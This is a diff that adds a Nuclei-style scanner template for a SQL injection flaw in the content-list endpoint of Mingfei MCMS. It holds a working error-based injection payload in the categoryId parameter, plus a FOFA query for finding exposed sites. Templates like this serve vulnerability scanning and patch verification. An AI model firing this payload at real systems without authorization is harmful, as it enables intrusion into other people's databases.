@@ -1,0 +1,26 @@
+id: mingfei-cms-list-sqli
+
+info:
+  name: "铭飞 CMS 列表接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+      该漏洞源于铭飞CMS系统在处理列表接口请求时未正确过滤用户输入参数，攻击者可通过构造特定SQL语句实现数据库敏感信息获取。漏洞影响范围包含部署了相关组件的Web应用系统。
+  tags: 铭飞 CMS
+
+http:
+- raw:
+  - |
+    GET /cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)%20and%20%271 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - '202cb962ac59075'
